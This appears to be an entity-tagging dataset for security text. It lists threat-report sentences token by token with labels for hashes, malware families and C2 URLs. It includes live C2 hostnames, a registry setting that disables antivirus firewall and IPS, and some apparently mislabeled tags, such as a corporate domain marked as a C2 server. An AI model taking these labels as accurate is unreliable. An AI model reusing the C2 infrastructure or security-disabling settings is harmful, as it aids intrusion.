SPEARPHISHING	O
EMAILS	O
,	O
COMMAND	O
AND	O
CONTROL	O
TO	O
JAPAN	O
AND	O
TAIWAN	O
,	O
AS	O
WELL	O
AS	O
THE	O
REST	O
OF	O
THE	O
WORLD	O
POSSIBLE	O
SHARING	O
OF	O
TOOL	O
ACROSS	O
ATTACK	O
GROUPS	O

This	O
command	O
populates	O
the	O
file	O
scxrt2.ini	O
with	O
a	O
comma-separated	O
list	O
of	O
network	O
resources	O
identified	O
by	O
the	O
host	O
system	O
.	O

The	O
executables	O
are	O
RC4	O
encrypted	O
and	O
then	O
attached	O
.	O

It	O
is	O
highly	O
probable	O
that	O
the	O
malware	O
was	O
developed	O
in	O
native	O
Chinese	O
language	O
,	O
and	O
the	O
operation	O
control	O
system	O
is	O
designed	O
for	O
Chinese	O
users	O
,	O
indicating	O
the	O
entire	O
operation	O
is	O
Chinese	O
.	O

Figure	O
9	O
:	O
IIS	O
directory	O
showing	O
time	O
stamps	O
prior	O
to	O
the	O
time	O
modification	O

SHA1	O
SHA256	O
5ba8c42807bee050aa474fe3c876936d196c65dca9895ccd2e317133188c905e	B-hash
161c840748df9b49fda878394398425a	B-hash
e3cc84a4dc66e43453a039c3c983fcef92eafa7d	B-hash

By	O
adding	O
the	O
URI	O
generator	O
of	O
the	O
HTTPprov	O
library	O
,	O
the	O
following	O
URL	O
could	O
be	O
generated	O
:	O

We	O
have	O
seen	O
this	O
campaign	O
use	O
both	O
email	O
and	O
drive­by	O
downloads	O
as	O
a	O
means	O
of	O
infecting	O
end	O
users	O
.	O

Once	O
the	O
filename	O
and	O
command	O
string	O
is	O
extracted	O
,	O
the	O
malware	O
compares	O
the	O
command	O
string	O
with	O
the	O
string	O

File	O
Name	O
:	O
Payment	B-malware.infosteal
details.jar	I-malware.infosteal
File	O
Size	O
:	O
43887	O
bytes	O
MD5	O
:	O
bd0aba05d8263fb1a9a3adcae01fc3b7	B-hash
SHA1	O
:	O
c60551e65cbe54899d1cd1f637b572455dc33b1b	B-hash

The	O
data	O
is	O
stored	O
in	O
the	O
last	O
0x100	O
bytes	O
of	O
the	O
file	O
.	O

The	O
BBC	O
.	O

These	O
hostnames	O
may	O
be	O
related	O
but	O
at	O
the	O
time	O
of	O
this	O
writing	O
we	O
have	O
not	O
seen	O
them	O
in	O
use	O
in	O
malware	O
and	O
are	O
unable	O
to	O
confirm	O
.	O

5/10	O

As	O
shown	O
in	O
the	O
hit	O
log	O
above	O
,	O
the	O
most-downloaded	O
malicious	O
modules	O
are	O
the	O
SFX	O
installer	O
and	O
the	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
backdoor	O
.	O

The	O
characteristics	O
of	O
the	O
malware	O
(	O
'	O
a.txt	O
'	O
and	O
'	O
config.json	O
'	O
files	O
)	O
and	O
the	O
functionality	O
of	O
it	O
is	O
very	O
similar	O
to	O
JSocket	B-malware.backdoor
and	O
AlienSpy	B-malware.backdoor
famous	O
Android	O
Remote	O
Access	O
Tools	O
(	O
RATs	O
)	O
.	O

HTTP/1.0	O
200	O
Server	O
:	O
Apache/2.2.3	O
(	O
Red	O
Hat	O
)	O
Accept-Ranges	O
:	O
bytes	O
Content-Type	O
:	O
text/html	O
Proxy-Connection	O
:	O
keep-alive	O

In	O
addition	O
,	O
some	O
variants	O
copy	O
the	O
file	O
name	O
and	O
use	O
it	O
as	O
the	O
decoy	O
document	B-malware.backdoor
file	O
name	O
.	O

The	O
Islamic	O
Republic	O
has	O
historically	O
preferred	O
to	O
use	O
proxies	O
or	O
front	O
organizations	O
both	O
in	O
physical	O
conflict	O
—	O
Hezbollah	O
against	O
Israel	O
and	O
Yemen	O
rebels	O
against	O
Saudi	O
Arabia	O
—	O
and	O
cyberattacks	O
to	O
achieve	O
their	O
policy	O
goals	O
.	O

What	O
makes	O
the	O
server	O
variant	O
interesting	O
is	O
the	O
device	O
driver	O
that	O
the	O
variant	O
installs	O
.	O

Spearphishing	O
emails	O
and	O
malware	O
sent	O
to	O
the	O
family	O
and	O
their	O
associates	O
during	O
this	O
period	O
may	O
have	O
been	O
intended	O
to	O
help	O
track	O
Alma	O
and	O
Alua	O
's	O
movements	O
in	O
preparation	O
for	O
this	O
incident	O
.	O

The	O
Retro	B-malware.backdoor
backdoor	O
is	O
an	O
evolution	O
of	O
the	O
Lucker	B-malware.backdoor
backdoor	O
and	O
it	O
actives	O
in	O
a	O
series	O
of	O
attacks	O
from	O
2016	O
till	O
now	O
.	O

0x10	O
0x12	O
0x19	O
0x1A	O
0x1B	O
드라이브	O
정보	O
파일	O
검색	O
인터넷에서	O
데이터	O
받아	O
파일	O
생성	O
일정	O
시간	O
후	O
메인	O
기능	O
재실행	O
nehomegpa.dll	O
파일	O
옮김	O
프로세스	O
리스트	O
얻기	O
프로세스	O
종료	O
권한	O
상승	O
[	O
표	O
4	O
]	O
Phandoor	B-malware.backdoor
주요	O
명령	O
Andaratm	B-malware.backdoor
악성코드는	O
2016년	O
군사	O
기관	O
공격	O
,	O
2017년	O
ATM	O
•	O
금융사	O
공격	O
,	O
2018년	O
가상	O
화폐	O
거래소	O
공격에	O
사용되었다	O
.	O

The	O
server	O
variant	O
then	O
attempts	O
to	O
determine	O
if	O
it	O
has	O
suitable	O
access	O
rights	O
within	O
the	O
system	O
in	O
order	O
to	O
operation	O
.	O

Buffer.BlockCopy	O
(	O
Resource1._1	O
,	O
54	O
,	O
array	O
,	O
0	O
,	O
30720	O
)	O
;	O
for	O
(	O
int	O
i	O
=	O
0	O
;	O
i	O
<	O
array.Length	O
;	O
i++	O
)	O
byte	O
b	O
=	O
56	O
;	O
array	O
[	O
i	O
]	O
^=	O
b	O
;	O

Function	O
DecryptCommandBuffer_sub_44C628	O
(	O
)	O

We	O
expect	O
that	O
APT12	O
will	O
continue	O
their	O
trend	O
and	O
evolve	O
and	O
change	O
its	O
tactics	O
to	O
stay	O
ahead	O
of	O
network	O
defenders	O
.	O

She	O
also	O
sent	O
him	O
a	O
screenshot	O
to	O
show	O
what	O
Tweety	B-malware.backdoor
Chat	I-malware.backdoor
looked	O
like	O
.	O

The	O
Network	O
Security	O
protection	O
of	O
IPS	O
and	O
NGFW	O
have	O
up-to-date	O
signatures	O
to	O
detect	O
malicious	O
network	O
activity	O
by	O
threat	O
actors	O
.	O

[	O
RC4	O
key	O
(	O
4	O
bytes	O
)	O
]	O
[	O
encrypted	O
data	O
]	O

It	O
can	O
be	O
extremely	O
time-consuming	O
just	O
going	O
through	O
the	O
dump	O
of	O
functions	O
that	O
have	O
no	O
meaning	O
at	O
all	O
in	O
the	O
code	O
–	O
and	O
this	O
is	O
only	O
one	O
of	O
the	O
more	O
simplistic	O
tactics	O
this	O
malware	O
is	O
using	O
.	O

In	O
the	O
example	O
,	O
link	O
analysis	O
is	O
provided	O
by	O
PalantirTM	O
.	O

All	O
rights	O
reserved	O
.	O

To	O
reduce	O
false	O
positives	O
,	O
tighten	O
the	O
Snort	O
IDS	O
signature	O
to	O
focus	O
on	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
by	O
looking	O
for	O
contents	O
of	O
'	O
FromBase64String	O
'	O
and	O
'	O
z1	O
'	O
as	O
follows	O
:	O

Analysis	O
determined	O
the	O
command	O
format	O
was	O
:	O
drive	O
identification	O
followed	O
by	O
one	O
or	O
more	O
command	O
and	O
parameter	O
strings	O
.	O

There	O
is	O
not	O
signifi	O
cant	O
evidence	O
to	O
attribute	O
the	O
operation	O
directly	O
to	O
the	O
Chinese	O
Government	O
.	O

Supported	O
commands	O
and	O
their	O
respective	O
codes	O

This	O
operation	O
made	O
little	O
sense	O
in	O
comparison	O
to	O
the	O
other	O
more	O
complicated	O
reordering	O
and	O
longer	O
XOR	O
encodings	O
used	O
prior	O
to	O
this	O
mechanism	O
.	O

In	O
addition	O
,	O
they	O
also	O
used	O
similar	O
anonymization	O
services	O
for	O
their	O
domains	O
repeatedly	O
.	O

'	O
SC	O
'	O
command	O
used	O
to	O
create	O
the	O
target	O
service	O
,	O
and	O
parsed	O
by	O
'	O
ProcessScCommand	O
'	O
routine	O
The	O
installed	O
service	O
registry	O
key	O
is	O
opened	O
and	O
the	O
2	O
values	O
under	O
its	O
Parameter	O
subkey	O
are	O
created	O
.	O

The	O
core	O
of	O
the	O
FireEye	O
platform	O
is	O
a	O
virtual	O
execution	O
engine	O
,	O
complemented	O
by	O
dynamic	O
threat	O
intelligence	O
,	O
to	O
identify	O
and	O
block	O
cyber	O
attacks	O
in	O
real	O
time	O
.	O

Projects	O
:	O

The	O
review	O
of	O
network	O
perimeter	O
netflow	O
or	O
firewall	O
logs	O
will	O
assist	O
in	O
determining	O
whether	O
your	O
network	O
has	O
experienced	O
suspicious	O
activity	O
.	O

Consequently	O
,	O
offline	O
analysis	O
is	O
possible	O
,	O
although	O
more	O
laborious	O
than	O
online	O
analysis	O
,	O
whereby	O
the	O
analyst	O
may	O
either	O
instrument	O
a	O
mock	O
victim	O
or	O
create	O
a	O
man-in-the-middle	O
service	O
,	O
then	O
attempt	O
to	O
be	O
exploited	O
by	O
the	O
attacker	O
.	O

There	O
are	O
minor	O
differences	O
between	O
the	O
ZxShell	B-malware.backdoor
implementation	O
of	O
this	O
command	O
and	O
the	O
original	O
Windows	O
one	O
,	O
but	O
they	O
are	O
irrelevant	O
for	O
the	O
purpose	O
of	O
the	O
analysis	O
The	O
command	O
used	O
to	O
install	O
the	O
service	O
is	O
:	O

E28EABEB678AFB5E172F4127C5692E742809FD86DFA8478C1DC6F9C13B2A8E5F	B-hash
was	O
'	O
unknown	O
'	O
to	O
AMP	O
on	O
2014-05-06	O
,	O
but	O
detected	O
as	O
malicious	O
the	O
next	O
time	O
it	O
was	O
seen	O
on	O
a	O
customer	O
's	O
machine	O
on	O
2014-05-07	O
.	O

In	O
order	O
to	O
infect	O
the	O
victims	O
,	O
the	O
attackers	O
distributed	O
spear-phishing	O
emails	O
containing	O
malicious	O
word	O
document	O
which	O
dropped	O
a	O
malware	O
capable	O
of	O
spying	O
on	O
infected	O
systems	O
.	O

In	O
addition	O
,	O
the	O
attacker	O
used	O
the	O
following	O
tools	O
:	O
CredRaptor	O
(	O
password	O
stealer	O
)	O
Plainpwd	O
(	O
modified	O
Mimikatz	O
used	O
for	O
recovering	O
Windows	O
credentials	O
from	O
memory	O
)	O
SysInternals	O
'	O
PsExec	O
(	O
used	O
for	O
lateral	O
movement	O
)	O
As	O
mentioned	O
above	O
,	O
in	O
the	O
final	O
stage	O
of	O
their	O
attacks	O
,	O
the	O
TeleBots	O
attackers	O
pushed	O
ransomware	O
using	O
stolen	O
Windows	O
credentials	O
and	O
SysInternals	O
'	O
PsExec	O
.	O

In	O
addition	O
to	O
the	O
icon.swf	O
HT	O
0day	O
(	O
214709aa7c5e4e8b60759a175737bb2b	O
)	O
,	O
it	O
looks	O
as	O
though	O
the	O
'	O
tisone360.com	O
'	O
site	O
was	O
delivering	O
a	O
Flash	O
CVE-2014-0497	O
exploit	O
in	O
April	O
.	O

FireEye	O
identified	O
overlaps	O
between	O
the	O
domain	O
registration	O
details	O
of	O
CyberCaliphate	B-malware.infosteal
's	O
website	O
and	O
APT28	B-malware.infosteal
infrastructure	O
.	O

This	O
,	O
in	O
conjunction	O
with	O
the	O
nature	O
of	O
the	O
related	O
files	O
we	O
have	O
discovered	O
(	O
all	O
of	O
them	O
are	O
directly	O
executable	O
files	O
)	O
means	O
it	O
is	O
likely	O
that	O
the	O
malware	O
is	O
primarily	O
delivered	O
via	O
spear	O
phishing	O
attempts	O
,	O
rather	O
than	O
any	O
other	O
method	O
.	O

Every	O
binary	O
created	O
using	O
the	O
Microsoft	O
Visual	O
Studio	O
toolchain	O
has	O
a	O
special	O
header	O
that	O
contains	O
information	O
about	O
the	O
number	O
of	O
input	O
object	O
files	O
and	O
version	O
information	O
of	O
the	O
compilers	O
used	O
to	O
create	O
them	O
,	O
the	O
'	O
Rich	O
'	O
header	O
called	O
so	O
by	O
the	O
magic	O
string	O
that	O
is	O
used	O
to	O
identify	O
it	O
in	O
the	O
file	O
.	O

Name	O
of	O
signer	O
:	O
Signing	O
time	O
:	O
Certificate	O
serial	O
#	O
:	O
63	O
6c	O
75	O
43	O
dd	O
bd	O
f9	O
69	O
f4	O
73	O
16	O
0f	O
4b	O
09	O
9b	O
9e	O
Cisco	O
Systems	O
,	O
Inc	O
.	O

Second	O
stage	O
payloads	O

Therefore	O
,	O
in	O
most	O
cases	O
a	O
vigilant	O
target	O
should	O
be	O
able	O
to	O
notice	O
the	O
attack	O
and	O
avoid	O
infection	O
.	O

APT32	B-malware.infosteal
often	O
deploys	O
these	O
backdoors	O
along	O
with	O
the	O
commercially-available	O
Cobalt	O
Strike	O
BEACON	O
backdoor	O
.	O

This	O
is	O
unfortunately	O
not	O
available	O
for	O
analysis	O
currently	O
.	O

SHA1	O
Compile	O
time	O
Size	O
(	O
bytes	O
)	O
Filename	O
525a8e3ae4e3df8c9c61f2a49e38541d196e9228	O
2016-02-05	O
11:46:20	O
65,536	O
evtdiag.exe	B-malware.drop
76bab478dcc70f979ce62cd306e9ba50ee84e37e	O
2016-02-04	O
13:45:39	O
16,384	O
evtsys.exe	B-malware.drop
70bf16597e375ad691f2c1efa194dbe7f60e4eeb	O
2016-02-05	O
08:55:19	O
24,576	O
nroff_b.exe	B-malware.drop
6207b92842b28a438330a2bf0ee8dcab7ef0a163	O
N/A	O
33,848	O
gpca.dat	B-malware.unknown
We	O
believe	O
all	O
files	O
were	O
created	O
by	O
the	O
same	O
actor	O
(	O
s	O
)	O
,	O
but	O
the	O
main	O
focus	O
of	O
the	O
report	O
will	O
be	O
on	O

Not	O
all	O
of	O
the	O
plugins	O
are	O
downloaded	O
to	O
every	O
target	O
.	O

In	O
other	O
situations	O
,	O
the	O
initial	O
sample	O
may	O
not	O
even	O
be	O
 agged	O
as	O
malicious	O
due	O
to	O
evasion	O
techniques	O
being	O
utilized	O
.	O

Encryption	O
of	O
code	O
and	O
configurations	O
using	O
cipher	O
algorithms	O
such	O
as	O
the	O
Advanced	O
Encryption	O
Standard	O
(	O
AES	O
)	O
,	O
RSA	O
,	O
and	O
Rivest	O
Cipher	O
4	O
(	O
RC4	O
)	O
enabled	O
them	O
to	O
evade	O
detection	O
and	O
prolong	O
analysis	O
.	O

The	O
malware	O
after	O
execution	O
keeps	O
track	O
of	O
the	O
user	O
activity	O
(	O
like	O
applications	O
opened	O
,	O
files	O
opened	O
etc	O
)	O
but	O
does	O
not	O
immediately	O
generate	O
any	O
network	O
traffic	O
,	O
this	O
is	O
to	O
make	O
sure	O
that	O
no	O
network	O
activity	O
is	O
generated	O
during	O
automated/sandbox	O
analysis	O
.	O

The	O
ZxShell	B-malware.backdoor
mutex	O
is	O
created	O
named	O
@	B-malware.backdoor
_	I-malware.backdoor
ZXSHELL	I-malware.backdoor
_	O
@	O
.	O

F	O
:	O
\Projects\g3\G3	O
Version	O
4.0\G3\G3\obj\Release\Intel	O
Core.pdb	O

The	O
malicious	O
code	O
checks	O
permissions	O
and	O
asks	O
for	O
additional	O
permissions	O
if	O
it	O
does	O
not	O
already	O
have	O
them	O
:	O
Permission	O
to	O
access	O
the	O
user	O
's	O
contact	O
list	O
(	O
PhnNumber	O
:	O
:getContAccess	O
)	O
Permission	O
to	O
access	O
the	O
user	O
's	O
photos	O
(	O
PhnNumber	O
:	O
:getPAccess	O
)	O
Permission	O
to	O
access	O
the	O
user	O
's	O
photos	O
(	O
PhnNumber	O
:	O
:getPAccess	O
)	O
One	O
of	O
the	O
most	O
relevant	O
features	O
of	O
these	O
compromised	O
versions	O
of	O
the	O
applications	O
is	O
the	O
Telegram	O
and	O
WhatsApp	O
message	O
stealing	O
feature	O
.	O

Casting	O
a	O
wider	O
net	O
After	O
compromising	O
indiscriminate	O
targets	O
,	O
attackers	O
may	O
dig	O
deeper	O
into	O
specific	O
targets	O
of	O
interest	O
and/or	O
sell	O
off	O
the	O
access	O
rights	O
of	O
the	O
victims	O
'	O
systems	O
and	O
their	O
data	O
to	O
others	O
.	O

www.accenture.com	B-url.cncsvr

Confucius	O
targeted	O
a	O
particular	O
set	O
of	O
individuals	O
in	O
South	O
Asian	O
countries	O
,	O
such	O
as	O
military	O
personnel	O
and	O
businessmen	O
,	O
among	O
others	O
.	O

This	O
map	O
offers	O
a	O
simplifi	O
ed	O
view	O
of	O
the	O
location	O
and	O
nature	O
of	O
the	O
targets	O
.	O

AgentKernel	O
Keylogger	O
Coder	O
Cryptor	O
State-sponsored	O
threat	O
actors	O
go	O
to	O
great	O
lengths	O
to	O
reach	O
their	O
goals	O
.	O

Otherwise	O
,	O
ZxShell	B-malware.backdoor
tries	O
to	O
connect	O
to	O
the	O
first	O
item	O
of	O
the	O
list	O
.	O

An	O
Engineering	O
Workstation	O
is	O
a	O
computer	O
used	O
for	O
configuration	O
,	O
maintenance	O
and	O
diagnostics	O
of	O
the	O
control	O
system	O
applications	O
and	O
other	O
control	O
system	O
equipment	O
.	O

Figure	O
24	O
:	O
Keylogger	O
Function	O

The	O
Central	O
Bureau	O
of	O
Investigation	O
(	O
CBI	O
)	O
is	O
the	O
domestic	O
intelligence	O
and	O
security	O
service	O
of	O
India	O
and	O
serves	O
as	O
the	O
India	O
's	O
premier	O
investigative	O
and	O
Interpol	O
agency	O
operating	O
under	O
the	O
jurisdiction	O
of	O
the	O
Government	O
of	O
India	O
.	O

Western	O
businesses	O
should	O
closely	O
monitor	O
geopolitical	O
events	O
initiated	O
by	O
the	O
United	O
States	O
or	O
Europe	O
that	O
affect	O
Iran	O
.	O

Figure	O
3	O
:	O

Recent	O
reporting	O
regarding	O
North	O
Korean	O
attacks	O
against	O
cryptocurrency	O
exchanges	O
and	O
using	O
Pyeongchang	O
Olympics	O
as	O
a	O
lure	O
describe	O
techniques	O
that	O
are	O
unusual	O
for	O
the	O
Lazarus	O
Group	O
.	O

CrowdStrike	O
Services	O
Inc.	O
,	O
our	O
Incident	O
Response	O
group	O
,	O
was	O
called	O
by	O
the	O
Democratic	O
National	O
Committee	O
(	O
DNC	O
)	O
,	O
the	O
formal	O
governing	O
body	O
for	O
the	O
US	O
Democratic	O
Party	O
,	O
to	O
respond	O
to	O
a	O
suspected	O
breach	O
.	O

For	O
example	O
Casper	B-malware.unknown
used	O
an	O
'	O
ID	O
'	O
value	O
set	O
to	O
'	O
13001	O
'	O
,	O
whereas	O
some	O
Babar	B-malware.unknown
samples	O
used	O
'	O
12075­01	O
'	O
and	O
'	O
11162­01	O
'	O
.	O

We	O
were	O
able	O
to	O
discover	O
four	O
distinct	O
versions	O
of	O
GravityRAT	B-malware.drop
,	O
developed	O
over	O
two	O
years	O
.	O

Many	O
of	O
the	O
victims	O
have	O
joint	O
ventures	O
or	O
partner	O
operations	O
in	O
Brazil	O
.	O

Collaboration	O
with	O
information­sharing	O
partners	O
and	O
victim	O
institutions	O
allowed	O
us	O
to	O
become	O
aware	O
of	O
the	O
more	O
complicated	O
business	O
cycle	O
involved	O
in	O
this	O
story	O
,	O
greatly	O
adding	O
to	O
our	O
research	O
interest	O
in	O
tracking	O
these	O
campaigns	O
.	O

The	O
only	O
documented	O
case	O
is	O
the	O
Benny	O
Gantz-themed	O
email	O
which	O
triggered	O
the	O
investigation	O
.	O

<	O
div	O
id='silverlightControlHost	O
'	O
>	O
<	O
object	O
data='data	O
:	O
application/x-silverlight	O
,	O
'	O
type='application/x-silverlight-2	O
'	O
width='100	O
%	O
'	O
height='100	O
%	O
'	O
>	O
<	O
param	O
name='source	O
'	O
value='ClientBin/MisaporPortalUI.xap?ver=1.0.7.0'/	O
>	O
<	O
param	O
name='onerror	O
'	O
value='onSilverlightError	O
'	O
/	O
>	O
<	O
param	O
name='background	O
'	O
value='white	O
'	O
/	O
>	O
<	O
param	O
name='minRuntimeVersion	O
'	O
value='3.0.40624.0	O
'	O
/	O
>	O
<	O
param	O
name='autoUpgrade	O
'	O
value='true	O
'	O
/	O
>	O
<	O
a	O
href='/web/20170203175640/	B-url.unknown
http://go.microsoft.com/fwlink/	I-url.unknown
?	O

Epic/Tavdig	B-malware.backdoor
backdoors	O
:	O

The	O
download	O
server	O
also	O
contains	O
a	O
Remote	O
Access	O
Trojan	O
developed	O
in	O
Python	O
(	O
both	O
client	O
and	O
server	O
)	O
.	O

The	O
XOR	O
keys	O
used	O
are	O
0x39	O
and	O
0x71	O
.	O

The	O
archive	O
contains	O
an	O
.exe	O
file	O
,	O
sometimes	O
disguised	O
as	O
a	O
Microsoft	O
Word	O
file	O
,	O
a	O
video	O
,	O
or	O
another	O
file	O
format	O
,	O
using	O
the	O
corresponding	O
icon	O
.	O

The	O
Shamoon	B-malware.unknown
sample	O
Fidelis	O
researchers	O
had	O
available	O
looked	O
very	O
similar	O
to	O
that	O
detailed	O
in	O
community	O
write-ups	O
.	O

This	O
approach	O
is	O
rather	O
inherent	O
to	O
many	O
amateur	O
virus-writers	O
and	O
these	O
malware	O
attacks	O
are	O
mostly	O
ignored	O
.	O

A5bddb5b10d673cbfe9b16a062ac78c9aa75b61c	B-hash

da02193fc7f2a628770382d9b39fe8e0	B-hash
3d0d71fdedfd8945d78b64cdf0fb11ed	B-hash
63069c9bcc4f8e16412ea1a25f3edf14	B-hash
8152e241b3f1fdb85d21bfcf2aa8ab1d	B-hash

NALYSIS	O
ON	O
MODULE	O
2	O
.............................................................................................................................................	O
5	O

Command-and-Control	O

When	O
ANEL	B-malware.backdoor
executes	O
,	O
a	O
decrypted	O
DLL	O
file	O
with	O
the	O
filename	O
'	O
lena_http_dll.dll	O
'	O
is	O
expanded	O
in	O
memory	O
.	O

Dropped	O
Malware	O
Samples	O
:	O

In	O
reality	O
,	O
running	O
the	O
.LNK	B-malware.drop
file	O
executes	O
the	O
malware	O
.	O

취약점	O
공격에	O
성공하면	O
웹브라우저로	O
접속한	O
시스템에	O
자바	O
스크립트나	O
VB	O
스크립트	O
파일이	O
생성되며	O
,	O
이를	O
통해	O
특정	O
주소에서	O
악성코드를	O
다운로드한다	O
.	O

Consider	O
restricting	O
access	O
to	O
sensitive	O
password	O
hashes	O
by	O
using	O
a	O
shadow	O
password	O
file	O
or	O
equivalent	O
on	O
UNIX	O
systems	O
.	O

On	O
the	O
k	O
th	O
iteration	O
,	O
one	O
of	O
the	O
swapped	O
elements	O
is	O
always	O
the	O
k	O
th	O
element	O
,	O
which	O
is	O
pointed	O
to	O
by	O
register	O
ECX	O
;	O
the	O
other	O
is	O
chosen	O
based	O
on	O
the	O
key	O
string	O
.	O

Whereas	O
previously	O
it	O
relied	O
on	O
one	O
service	O
provider	O
(	O
CloudMe.com	O
)	O
,	O
more	O
recently	O
it	O
has	O
employed	O
a	O
least	O
 ve	O
cloud	O
service	O
providers	O
Leveraging	O
the	O
cloud	O
for	O
C	O
&	O
C	O
has	O
a	O
number	O
of	O
advantages	O
for	O
groups	O
like	O
Inception	B-malware.backdoor
.	O

The	O
Carbanak	B-malware.infosteal
team	O
does	O
not	O
just	O
blindly	O
compromise	O
large	O
numbers	O
of	O
computers	O
and	O
try	O
to	O
'	O
milk	O
the	O
cow	O
'	O
as	O
other	O
actors	O
do	O
,	O
instead	O
they	O
act	O
like	O
a	O
mature	O
APT-group	O
.	O

Ultimately	O
,	O
these	O
emergent	O
economies	O
are	O
likely	O
seeking	O
to	O
hasten	O
their	O
path	O
to	O
success	O
in	O
fulfilling	O
national	O
objectives	O
via	O
the	O
'	O
short-cut	O
'	O
that	O
cyber	O
espionage	O
offers	O
.	O

After	O
further	O
researching	O
the	O
associated	O
infrastructure	O
of	O
the	O
C2	O
(	O
Figure	O
13	O
)	O
,	O
we	O
were	O
able	O
to	O
find	O
potential	O
number	O
of	O
victims	O
for	O
this	O
particular	O
campaign	O
.	O

Then	O
it	O
transmits	O
by	O
making	O
use	O
of	O
both	O
RSA	O
and	O
BASE64	O
encryption	O
.	O

Figure	O
1	O
:	O
SSH	O
tool	O
disguise	O
Figure	O
2	O
Create	O
dummy	O
certificate	O
files	O

154261a4aab73f1ceef28695d8837902cc1e8b5cca0b8fc81ddeda350564adc0	B-hash
-	O
MSOffice/CVE_2017_11882.A!tr	O
05dcc7856661244d082daa88a074d2f266c70623789a7bb5a919282b178d8f98	B-hash
-	O
W32/Sarhust.D!tr	O
hxxp://157.52.167.71:29317/office/word/2003/ph2/philip.varilla	B-url.unknown
hxxp://publicdfaph.publicvm.com:8080/	B-url.cncsvr

HKLMSOFTWAREAhnLabV3	O
365	O
ClinicInternetSec	O
UseFw	O
=	O
0	O
UseIps	O
=	O
0	O

Then	O
,	O
it	O
reads	O
user-related	O
info	O
from	O
the	O
file	O
sqlxmlx.inc	O
in	O
the	O
same	O
folder	O
(	O
we	O
can	O
see	O
strings	O
referencing	O
to	O
'	O
UserID	O
'	O
commentary	O
in	O
this	O
part	O
of	O
the	O
code	O
)	O
.	O

As	O
we	O
stated	O
earlier	O
,	O
some	O
of	O
the	O
features	O
of	O
the	O
original	O
ScanBox	B-malware.infosteal
code	O
were	O
probably	O
designed	O
to	O
help	O
those	O
analysing	O
results	O
distinguish	O
between	O
honeypots/analysis	O
environments	O
and	O
real-world	O
victims	O
.	O

At	O
least	O
35	O
victim	O
companies	O
have	O
been	O
identified	O
with	O
primary	O
targets	O
including	O
financial	O
and	O
government	O
institutions	O
,	O
telecommunications	O
,	O
manufacturing	O
,	O
energy	O
and	O
other	O
service	O
utility	O
companies	O
,	O
as	O
well	O
as	O
media	O
and	O
public	O
relations	O
firms	O
.	O

In	O
our	O
Predictions	O
Report	O
we	O
discuss	O
how	O
our	O
conne	O
...	O
https://t.co/4ZQSgDurWwmcafee_labs	O
In	O
a	O
recent	O
campaign	O
,	O
the	O
Sun	O
Team	O
hacking	O
group	O
implanted	O
cryptocurrency-lending	O
platform	O
Falcon	O
Coin	O
,	O
but	O
the	O
similarly	O
named	O
domain	O
is	O
not	O
associated	O
with	O
the	O
legitimate	O
entity	O
.	O

page	O
|	O
13	O

The	O
indicators	O
associated	O
with	O
this	O
attack	O
are	O
provided	O
so	O
that	O
the	O
organizations	O
(	O
Government	O
,	O
Public	O
,	O
Private	O
organizations	O
and	O
Defense	O
sectors	O
)	O
can	O
use	O
these	O
indicators	O
to	O
detect	O
,	O
remediate	O
and	O
investigate	O
this	O
attack	O
campaign	O
.	O

The	O
dropper	O
part	O
has	O
the	O
following	O
flow	O
of	O
execution	O
:	O

In	O
fact	O
,	O
the	O
file	O
Outllib.dll	O
is	O
actually	O
the	O
Hussarini	B-malware.backdoor
backdoor	O
,	O
a	O
DLL	O
which	O
exports	O
functions	O
containing	O
the	O
malicious	O
code	O
.	O

Using	O
this	O
vulnerability	O
,	O
the	O
exploit	O
implements	O
a	O
series	O
of	O
writes	O
at	O
specified	O
addresses	O
to	O
achieve	O
full	O
remote	O
code	O
execution	O
.	O

This	O
file	O
was	O
a	O
self-extracting	O
(	O
SFX	B-malware.drop
)	O
archive	O
that	O
,	O
when	O
executed	O
,	O
presents	O
the	O
target	O
victim	O
with	O
a	O
12	O
page	O
decoy	O
PDF	O
document	O
.	O

The	O
Matryoshka	B-malware.unknown
infection	O
framework	O
is	O
built	O
of	O
three	O
parts	O
:	O

Figure	O
3	O
:	O
HIGHTIDE	B-malware.backdoor
GET	O
Request	O
Example	O

1	O
.	O

Each	O
packet	O
that	O
arrives	O
within	O
the	O
packet	O
queue	O
of	O
contains	O
a	O
standard	O
header	O
followed	O
by	O
a	O
(	O
quasi-optional	O
)	O
payload	O
data	O
blob	O
.	O

Figure	O
8	O
demonstrates	O
that	O
some	O
of	O
the	O
characters	O
in	O
the	O
window	O
are	O
not	O
in	O
English	O
and	O
are	O
not	O
displayed	O
properly	O
on	O
the	O
form	O
.	O

The	O
VMWare	O
check	O
looks	O
for	O
the	O
registry	O
HKLM\SOFTWARE\VMware	O
,	O
Inc.\VMware	O
Tools	O
and	O
the	O
files	O
%	O
WINDIR%\system32\drivers\vmmouse.sys	O
and	O
%	O
WINDIR%\system32\drivers\vmhgfs.sys	O
.	O

Encoding	O
the	O
encryption	O
key	O
In	O
order	O
for	O
the	O
C	O
&	O
C	O
server	O
to	O
decrypt	O
the	O
encrypted	O
data	O
,	O
the	O
randomly	O
generated	O
AES256	O
key	O
must	O
be	O
included	O
in	O
the	O
packet	O
along	O
with	O
the	O
encrypted	O
data	O
.	O

else	O

C	O
&	O
C	O
:	O

Each	O
attempt	O
may	O
either	O
succeed	O
or	O
fail	O
,	O
but	O
the	O
overall	O
goal	O
is	O
to	O
penetrate	O
the	O
target	O
's	O
network	O
and	O
acquire	O
information	O
.	O

35	O
.	O

Getting	O
object	O
by	O
index	O
from	O
constant	O
pool	O
without	O
any	O
checks	O

From	O
the	O
data	O
we	O
have	O
at	O
our	O
disposal	O
,	O
we	O
can	O
say	O
with	O
a	O
fair	O
degree	O
of	O
certainty	O
that	O
the	O
'	O
Tilded	O
'	O
platform	O
was	O
created	O
around	O
the	O
end	O
of	O
2007	O
or	O
early	O
2008	O
before	O
undergoing	O
its	O
most	O
significant	O
changes	O
in	O
summer/autumn	O
2010	O
.	O

Below	O
are	O
keywords	O
that	O
have	O
been	O
used	O
in	O
the	O
recent	O
campaigns	O
:	O

The	O
plugin	O
registry	O
key	O

microsoftservices.proxydns.com	B-url.unknown
-	O
current	O
rampage.freetcp.com	B-url.unknown
-	O
current	O
fighthard.mooo.com	B-url.unknown
-	O
9/8/2014	O
www.micro.zyns.com	B-url.unknown
-	O
current	O
computer001.dumb1.com	B-url.unknown
-	O
current	O
microlab.dns04.com	B-url.unknown
-	O
current	O
word.crabdance.com	B-url.unknown
-	O
11/12/2012	O
fighhard.mooo.com	B-url.unknown
-	O
1/31/2014	O
queenberry.www1.biz	B-url.unknown
-	O
2/14/2014	O
